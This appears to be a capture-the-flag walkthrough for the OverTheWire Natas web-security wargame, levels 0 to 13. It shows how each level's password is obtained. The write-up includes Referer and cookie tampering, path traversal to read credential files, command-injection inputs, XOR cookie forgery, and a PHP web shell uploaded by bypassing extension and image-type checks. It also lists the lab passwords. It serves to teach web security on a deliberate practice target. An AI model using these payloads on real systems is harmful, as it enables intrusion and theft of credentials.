# Natas

Natas teaches the basics of serverside web-security.

Each level of natas consists of its own website located at http://natasX.natas.labs.overthewire.org, where `X` is the level number. There is no SSH login. To access a level, enter the username for that level (e.g. `natas0` for level 0) and its password.

Each level has access to the password of the next level. Your job is to somehow obtain that next password and level up. All passwords are also stored in `/etc/natas_webpass/`. E.g. the password for `natas5` is stored in the file `/etc/natas_webpass/natas5` and only readable by `natas4` and `natas5`.

Start here:

Username: `natas0`
Password: `natas0`
URL: http://natas0.natas.labs.overthewire.org

## Natas 0

### Credentials

Username: natas0

Password: natas0

URL: http://natas0.natas.labs.overthewire.org

### Message

You can find the password for the next level on this page.

### Solution

View page source:

```
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas0", "pass": "natas0" };</script></head>
<body>
<h1>natas0</h1>
<div id="content">
You can find the password for the next level on this page.

<!--The password for natas1 is 0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq -->
</div>
</body>
</html>
```

## Natas 1

### Credentials

Username: natas1

Password: 0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq

URL: http://natas1.natas.labs.overthewire.org

### Message

You can find the password for the next level on this page, but rightclicking has been blocked!

### Solution

Use browser console (usually F12 opens it).

This allows to see the HTML content, which includes the following.

```
<h1>natas1</h1>
<div id="content">
You can find the password for the
next level on this page, but rightclicking has been blocked!

<!--The password for natas2 is TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI -->
</div>

...
```

## Natas 2

### Credentials

Username: natas2

Password: TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI

URL: http://natas2.natas.labs.overthewire.org

### Message

There is nothing on this page

### Solution

Page source:

```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas2", "pass": "TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI" };</script></head>
<body>
<h1>natas2</h1>
<div id="content">
There is nothing on this page
<img src="files/pixel.png">
</div>
</body></html>
```

Navigate to `http://natas2.natas.labs.overthewire.org/files/`. Here we find `pixel.png`, as expected, and `users.txt`:

```
# username:password
alice:BYNdCesZqW
bob:jw2ueICLvT
charlie:G5vCxkVV3m
natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH
eve:zo4mJWyNj2
mallory:9urtcpzBmH
```

## Natas 3

### Credentials

Username: natas3

Password: 3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH

URL: http://natas3.natas.labs.overthewire.org

### Message

There is nothing on this page

### Solution

Inner HTML:

```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas3", "pass": "3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH" };</script></head>
<body>
<h1>natas3</h1>
<div id="content">
There is nothing on this page
<!-- No more information leaks!! Not even Google will find it this time... -->
</div>
</body></html>
```

Have a look at `http://natas3.natas.labs.overthewire.org/robots.txt`:

```
User-agent: *
Disallow: /s3cr3t/
```

Thus go to `http://natas3.natas.labs.overthewire.org/s3cr3t/`. Here we find `users.txt` (at `http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt`):

```
natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ
```

## Natas 4

### Credentials

Username: natas4

Password: QryZXc2e0zahULdHrtHxzyYkj59kUxLQ

URL: http://natas4.natas.labs.overthewire.org

### Message

Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"

### Solution

Refresh the page with the link. The message changes to

> Access disallowed. You are visiting from "http://natas4.natas.labs.overthewire.org/" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"

Page source:

```
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas4", "pass": "QryZXc2e0zahULdHrtHxzyYkj59kUxLQ" };</script></head>
<body>
<h1>natas4</h1>
<div id="content">

Access disallowed. You are visiting from "http://natas4.natas.labs.overthewire.org/" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"
<br/>
<div id="viewsource"><a href="index.php">Refresh page</a></div>
</div>
</body>
</html>
```

Suspect that it has something to do with the request headers. Inspect them using the browser console. See:

```
Referer: http://natas4.natas.labs.overthewire.org/
```

Try to change that. A way is using Burp Suite. Edit the request header: intercept the request with Proxy, send it to Repeater and edit the `Referer` header setting it to `http://natas5.natas.labs.overthewire.org/`. This gives us a different response which contains:

```
<div id="content">

Access granted. The password for natas5 is 0n35PkggAPm2zbEpOU802c0x0Msn1ToK
<br/>
<div id="viewsource"><a href="index.php">Refresh page</a></div>
</div>
```

## Natas 5

### Credentials

Username: natas5

Password: 0n35PkggAPm2zbEpOU802c0x0Msn1ToK

URL: http://natas5.natas.labs.overthewire.org

### Message

Access disallowed. You are not logged in

### Solution

Intercepting the request, we see that this is:

```
GET /index.php HTTP/1.1
Host: natas5.natas.labs.overthewire.org
Cache-Control: max-age=0
Authorization: Basic bmF0YXM1OjBuMzVQa2dnQVBtMnpiRXBPVTgwMmMweDBNc24xVG9L
Accept-Language: en-GB
Upgrade-Insecure-Requests: 1
User-Agent: [UNDISCLOSED]
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Cookie: loggedin=0
Connection: keep-alive
```

Reading carefully, we notice: `Cookie: loggedin=0`.

Try to set this to `1` and resend the request...

This changes the response to:

```html
HTTP/1.1 200 OK
Date: Fri, 20 Sep 2024 16:30:46 GMT
Server: Apache/2.4.58 (Ubuntu)
Set-Cookie: loggedin=1
Vary: Accept-Encoding
Content-Length: 890
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas5", "pass": "0n35PkggAPm2zbEpOU802c0x0Msn1ToK" };</script></head>
<body>
<h1>natas5</h1>
<div id="content">
Access granted. The password for natas6 is 0RoJwHdSKWFTYR5WuiAewauSuNaBXned</div>
</body>
</html>
```

## Natas 6

### Credentials

Username: natas6

Password: 0RoJwHdSKWFTYR5WuiAewauSuNaBXned

URL: http://natas6.natas.labs.overthewire.org

### Message

Input secret: ...

Submit.

### Solution

The page requests a secret.

The source:

```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas6", "pass": "<censored>" };</script></head>
<body>
<h1>natas6</h1>
<div id="content">

<?

include "includes/secret.inc";

    if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
    }
?>

<form method=post>
Input secret: <input name=secret><br>
<input type=submit name=submit>
</form>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

Thus there is a `http://natas6.natas.labs.overthewire.org/includes/secret.inc` file... Try to get it with `curl`:

```bash
curl -H "Authorization: Basic bmF0YXM2OjBSb0p3SGRTS1dGVFlSNVd1aUFld2F1U3VOYUJYbmVk" http://natas6.natas.labs.overthewire.org/includes/secret.inc
<?
$secret = "FOEIUWGHFEEUHOFUOIU";
?>
```

Submit the secret in the field requiring it and get:

> Access granted. The password for natas7 is bmg8SvU1LizuWjx3y7xkNERkHxGre0GS

## Natas 7

### Credentials

Username: natas7

Password: bmg8SvU1LizuWjx3y7xkNERkHxGre0GS

URL: http://natas7.natas.labs.overthewire.org

### Message

There is a page with a **Home** and an **About** links.

### Solution

The Home page redirects to http://natas7.natas.labs.overthewire.org/index.php?page=home, the About page to http://natas7.natas.labs.overthewire.org/index.php?page=about.

Try to get http://natas7.natas.labs.overthewire.org/index.php?page=test:

> Warning: include(test): failed to open stream: No such file or directory in /var/www/natas/natas7/index.php on line 21

> Warning: include(): Failed opening 'test' for inclusion (include_path='.:/usr/share/php') in /var/www/natas/natas7/index.php on line 21

This error message is very useful... We can get a file from the file system, it seems.

It gives us also the base directory...

Try http://natas7.natas.labs.overthewire.org/index.php?page=../../../../../../../etc/passwd.

This works, but we are not interested in this...

Try: http://natas7.natas.labs.overthewire.org/index.php?page=../../../../../../../etc/natas_webpass/natas8.
This gives us:

> xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q

## Natas 8

### Credentials

Username: natas8

Password: xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q

URL: http://natas8.natas.labs.overthewire.org

### Message

Input secret: ...

### Solution

There is a View sourcecode link. The source code is this:

```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas8", "pass": "<censored>" };</script></head>
<body>
<h1>natas8</h1>
<div id="content">

<?

$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
?>

<form method=post>
Input secret: <input name=secret><br>
<input type=submit name=submit>
</form>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

We have two interesting pieces of information:

```
$encodedSecret = "3d3d516343746d4d6d6c315669563362";
```

and

```
function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}
```

We shall reverse the encoding on the given encoded secret; the value thus obtained shall be passed into the form in the page.

Try with the following reversing code:

```php
$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function decodeSecret($encodedSecret) {
    return base64_decode(strrev(hex2bin($encodedSecret)));
}

echo decodeSecret($encodedSecret);
```

This prints:

```
oubWYf2kBq
```

This works: it returns:

> Access granted. The password for natas9 is ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t

## Natas 9

### Credentials

Username: natas9

Password: ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t

URL: http://natas9.natas.labs.overthewire.org

### Message

Find words containing: ...

### Solution

There is the View sourcecode link.

The source code:

```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas9", "pass": "<censored>" };</script></head>
<body>
<h1>natas9</h1>
<div id="content">
<form>
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
</form>


Output:
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
</pre>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

The relevant PHP code:

```php
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
```

Try http://natas9.natas.labs.overthewire.org/?needle=password. This returns:

```
password
password's
passwords
```

The form does exactly this: it gets a word, say `asd`, and sends it to: http://natas9.natas.labs.overthewire.org/?needle=asd&submit=Search.

Find some interesting information about `passthru` here: https://www.php.net/manual/en/function.passthru.php.

The function is similar to `exec`.

If we input `zope dictionary.txt; cat `, we get what seems to be the content of `dictionary.txt`...

Interesting. Let's try

```
zope dictionary.txt; cat /etc/natas_webpass/natas10 | tee
```

This gives us:

```
t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
```

## Natas 10

### Credentials

Username: natas10

Password: t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu

URL: http://natas10.natas.labs.overthewire.org

### Message

For security reasons, we now filter on certain characters

Find words containing: ...

### Solution

Now `asd; cat` doesn't work anymore:

> Input contains an illegal character!

Neither does `&&`.

The source code (obtained from the link):

```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas10", "pass": "<censored>" };</script></head>
<body>
<h1>natas10</h1>
<div id="content">

For security reasons, we now filter on certain characters<br/><br/>
<form>
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
</form>


Output:
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
</pre>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

Try to exploit the behaviour of `grep`: this searches any given input file. We can provide more than one...

Input: `p /etc/natas_webpass/natas11`: this corresponds to the executed command:

```bash
grep -i p /etc/natas_webpass/natas11 dictionary.txt
```

so this will search both `dictionary.txt` and `/etc/natas_webpass/natas11` for the character `p` and gives us:

```
/etc/natas_webpass/natas11:UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk
...
```

## Natas 11

### Credentials

Username: natas11

Password: UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk

URL: http://natas11.natas.labs.overthewire.org

### Message

Cookies are protected with XOR encryption

Background color: [#ffffff]

### Solution

The source code (link):

```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas11", "pass": "<censored>" };</script></head>
<?

$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

function loadData($def) {
    global $_COOKIE;
    $mydata = $def;
    if(array_key_exists("data", $_COOKIE)) {
    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
        $mydata['showpassword'] = $tempdata['showpassword'];
        $mydata['bgcolor'] = $tempdata['bgcolor'];
        }
    }
    }
    return $mydata;
}

function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}

$data = loadData($defaultdata);

if(array_key_exists("bgcolor",$_REQUEST)) {
    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
        $data['bgcolor'] = $_REQUEST['bgcolor'];
    }
}

saveData($data);



?>

<h1>natas11</h1>
<div id="content">
<body style="background: <?=$data['bgcolor']?>;">
Cookies are protected with XOR encryption<br/><br/>

<?
if($data["showpassword"] == "yes") {
    print "The password for natas12 is <censored><br>";
}

?>

<form>
Background color: <input name=bgcolor value="<?=$data['bgcolor']?>">
<input type=submit value="Set color">
</form>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

From the code, we expect a cookie called `data` to be present. Effectively, the cookie is there and contains:

```
HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg%3D
```

We need to decode / decrypt it.

```php
$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

function loadData($def) {
    global $_COOKIE;
    $mydata = $def;
    if(array_key_exists("data", $_COOKIE)) {
    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
        $mydata['showpassword'] = $tempdata['showpassword'];
        $mydata['bgcolor'] = $tempdata['bgcolor'];
        }
    }
    }
    return $mydata;
}

function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}

$data = loadData($defaultdata);

if(array_key_exists("bgcolor",$_REQUEST)) {
    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
        $data['bgcolor'] = $_REQUEST['bgcolor'];
    }
}

saveData($data);
```

and in particular:

```php
$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}
```

Intercept a request:

```
GET /?bgcolor=%23ffaaaa HTTP/1.1
Host: natas11.natas.labs.overthewire.org
User-Agent: [UNDISCLOSED]
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://natas11.natas.labs.overthewire.org/
Authorization: Basic bmF0YXMxMTpVSmRxa0sxcFR1NlZMdDlVSFdBZ1JaejZzVlVaM2xFaw==
Connection: keep-alive
Cookie: data=HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEOBCU2TRg%3D
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Priority: u=0, i
```

This is the same cookie we see in the browser Storage:

```
HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEOBCU2TRg%3D
```

Code to decrypt the cookie:

```php
$cookie = "HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEOBCU2TRg";

function xor_encrypt($in) {
    $key = json_encode(array("showpassword" => "no", "bgcolor" => "#ffffff"));
    $text = base64_decode($in);
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

print xor_encrypt($cookie);
```

We get: `eDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWhbCPoe`

Now:

```php
$cookie = array("showpassword" => "yes", "bgcolor" => "#ffffff");

function xor_encrypt($in) {
    $key = "eDWo";
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

print base64_encode(xor_encrypt(json_encode($cookie)));
```

Got: `HmYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZzEJAyIxCUc5`.

This shows the password:

> The password for natas12 is yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB

## Natas 12

### Credentials

Username: natas12

Password: yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB

URL: http://natas12.natas.labs.overthewire.org

### Message

Choose a JPEG to upload (max 1KB):

### Solution

Source code (link):

```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas12", "pass": "<censored>" };</script></head>
<body>
<h1>natas12</h1>
<div id="content">
<?php

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);


        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?>

<form enctype="multipart/form-data" action="index.php" method="POST">
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
<input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />
Choose a JPEG to upload (max 1KB):<br/>
<input name="uploadedfile" type="file" /><br />
<input type="submit" value="Upload File" />
</form>
<?php } ?>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

One-liner PHP RCE code:

```php
<?php echo shell_exec($_GET['e'].' 2>&1'); ?>
```

Also, the client renames the file to `.jpg`:

```html
<input
  type="hidden"
  name="filename"
  value="<?php print genRandomString(); ?>.jpg"
/>
```

This can easily be changed: it's client side...

Edit the `.jpg` in `.php` and upload the PHP one-liner.

We get:

> The file upload/f2ce8mjyzp.php has been uploaded

So we use the link passing `e` as parameter: natas12.natas.labs.overthewire.org/upload/f2ce8mjyzp.php?e=cat /etc/natas_webpass/natas13.

Get: `trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC`.

## Natas 13

### Credentials

Username: natas13

Password: trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC

URL: http://natas13.natas.labs.overthewire.org

### Message

For security reasons, we now only accept image files!

Choose a JPEG to upload (max 1KB):

### Solution

Source code:

```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas13", "pass": "<censored>" };</script></head>
<body>
<h1>natas13</h1>
<div id="content">
For security reasons, we now only accept image files!<br/><br/>

<?php

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);

    $err=$_FILES['uploadedfile']['error'];
    if($err){
        if($err === 2){
            echo "The uploaded file exceeds MAX_FILE_SIZE";
        } else{
            echo "Something went wrong :/";
        }
    } else if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
        echo "File is not an image";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?>

<form enctype="multipart/form-data" action="index.php" method="POST">
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
<input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />
Choose a JPEG to upload (max 1KB):<br/>
<input name="uploadedfile" type="file" /><br />
<input type="submit" value="Upload File" />
</form>
<?php } ?>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

Try to bypass `exif_imagetype`: create a Python script that creates a `shell.php` with the desired JPEG image bytes:

```python
fh = open('shell.php', 'wb')
fh.write(b'\xFF\xD8\xFF\xE0' + b'<? passthru($_GET["cmd"]); ?>')
fh.close()
```

This gives us a `shell.php` that we can try to upload.

Do not forget to edit the file extension in the client-side code!

We are able to upload the `.php` file:

> The file upload/s81yasyzvd.php has been uploaded

Go to natas13.natas.labs.overthewire.org/upload/s81yasyzvd.php?cmd=cat /etc/natas_webpass/natas14:

```
z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ
```

## Natas 14

### Credentials

Username: natas14

Password: z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ

URL: http://natas14.natas.labs.overthewire.org

### Message

Username: ...

Password: ...

### Solution

Source code (link):

```html
<html>
<head>
